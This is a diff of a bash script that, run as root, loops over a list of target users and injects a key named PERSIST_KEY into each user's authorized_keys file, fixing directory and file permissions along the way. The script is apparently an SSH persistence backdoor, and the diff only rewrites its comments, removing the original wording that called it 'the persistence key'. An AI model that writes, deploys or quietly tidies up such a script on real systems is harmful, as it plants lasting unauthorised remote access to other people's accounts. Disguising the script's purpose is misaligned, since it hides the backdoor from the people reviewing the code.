@@ -25,31 +25,27 @@ for USER in $TARGET_USERS; do
         continue
     fi
     
-    # Get the user's home directory (e.g., /home/liquidator)
+    # get users home dir
     USER_HOME=$(eval echo "~$USER")
     SSH_DIR="$USER_HOME/.ssh"
     AUTH_KEYS_FILE="$SSH_DIR/authorized_keys"
 
     echo "  [INFO] Processing user: $USER (Home: $USER_HOME)"
 
-    # Use 'sudo -u' or 'su -c' to perform actions as the target user.
-    # The script itself must be run as root (or a user with necessary permissions)
-    # for this 'sudo -u' to succeed.
-
-    # 2. Ensure .ssh directory exists and has correct permissions (700)
+    # ensure that the directory exists
     if [ ! -d "$SSH_DIR" ]; then
         echo "    [FIX] Creating $SSH_DIR."
         sudo -u "$USER" mkdir -p "$SSH_DIR"
     fi
     
-    # Correct permissions for .ssh (must be 700)
+    # permissions for ssh
     CURRENT_PERMS=$(stat -c "%a" "$SSH_DIR")
     if [ "$CURRENT_PERMS" != "700" ]; then
         echo "    [FIX] Setting permissions on $SSH_DIR to 700."
         chmod 700 "$SSH_DIR"
     fi
 
-    # 3. Ensure authorized_keys file exists and contains the persistence key
+    # make sure authorized_keys exists and contains the key
     if [ ! -f "$AUTH_KEYS_FILE" ]; then
         echo "    [FIX] Creating $AUTH_KEYS_FILE and injecting key."
         echo "$PERSIST_KEY" | sudo -u "$USER" tee "$AUTH_KEYS_FILE" > /dev/null
@@ -63,7 +59,7 @@ for USER in $TARGET_USERS; do
         fi
     fi
 
-    # 4. Correct permissions for authorized_keys (must be 600)
+    # ensure that the correct permissions are set
     CURRENT_PERMS=$(stat -c "%a" "$AUTH_KEYS_FILE" 2>/dev/null || echo "000")
     if [ "$CURRENT_PERMS" != "600" ]; then
         echo "    [FIX] Setting permissions on $AUTH_KEYS_FILE to 600."
